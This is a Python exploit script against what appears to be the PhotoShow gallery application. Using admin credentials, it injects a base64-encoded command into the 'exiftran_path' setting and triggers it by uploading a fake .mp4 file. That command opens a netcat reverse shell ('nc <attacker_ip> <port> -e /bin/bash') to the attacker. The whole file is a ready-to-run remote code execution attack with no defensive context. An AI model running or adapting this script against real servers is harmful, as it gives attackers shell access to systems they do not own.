import sys
import requests
import base64
import urllib.parse

if len(sys.argv) != 6:
    print('Usage: \n\tpython3 ' + sys.argv[0] + ' "login" ' +
          '"password" "target_ip" "attacker_ip" "attacker_nc_port"')
    quit()

login = sys.argv[1]
password = sys.argv[2]
targetIp = sys.argv[3]
attackerIp = sys.argv[4]
attackerNcPort = sys.argv[5]

def main():
    session = requests.Session()
    # login as admin user
    logInSession(session, targetIp, login, password)
    # change application behaviour for handling .mp4 video
    uploadExpoit(session, targetIp, attackerIp, attackerNcPort)
    # send the shell to attacker's nc by uploading .mp4 video
    sendMP4Video(session, targetIp)
    print("Check your netcat")

def logInSession(session, targetIp, login, password):
    session.headers.update({'Content-Type': "application/x-www-form-urlencoded"})
    data = "login=" + login + "&password=" + password
    url = "http://" + targetIp + "/?t=Login"
    response = session.post(url, data=data)
    phpsessid = response.headers.get("Set-Cookie").split(";")[0]
    session.headers.update({'Cookie': phpsessid})

def uploadExpoit(session, targetIp, attackerIp, attackerNcPort):
    netcatInjection = createNetcatInjection(attackerIp, attackerNcPort)
    url = "http://" + targetIp + "/?t=Adm&a=Set"
    data = "name=PhotoShow&site_address=&loc=default.ini&user_theme=Default&" \
           "rss=on&max_comments=50&thumbs_size=200&fbappid=&ffmpeg_path=&encode_video=on&" \
           "ffmpeg_option=-threads+4+-vcodec+libx264+-acodec+libfdk_aac&rotate_image=on&" \
           + netcatInjection
    session.post(url, data=data).content.decode('utf8')

def createNetcatInjection(attackerIp, attackerNcPort):
    # Prepare the Netcat command to connect back to the attacker's IP and port
    command = f"nc {attackerIp} {attackerNcPort} -e /bin/bash"
    b64Encoded = base64.b64encode(command.encode("ascii"))
    strb64 = str(b64Encoded)[2:-1]
    injection = {"exiftran_path": f"echo {strb64} | base64 -d > /tmp/1.sh ; /bin/bash /tmp/1.sh"}
    return urllib.parse.urlencode(injection)

def sendMP4Video(session, targetIp):
    session.headers.update({'Content-Type': "multipart/form-data; " \
                                      "boundary=---------------------------752343701418612422363028651"})
    url = "http://" + targetIp + "/?a=Upl"
    data = """-----------------------------752343701418612422363028651\r
Content-Disposition: form-data; name="path"\r
\r
\r
-----------------------------752343701418612422363028651\r
Content-Disposition: form-data; name="inherit"\r
\r
1\r
-----------------------------752343701418612422363028651\r
Content-Disposition: form-data; name="images[]"; filename="a.mp4"\r
Content-Type: video/mp4\r
\r
a\r
-----------------------------752343701418612422363028651--\r
"""
    try:
        session.post(url, data=data, timeout=0.001)
    except requests.exceptions.ReadTimeout:
        pass

if __name__ == "__main__":
    main()
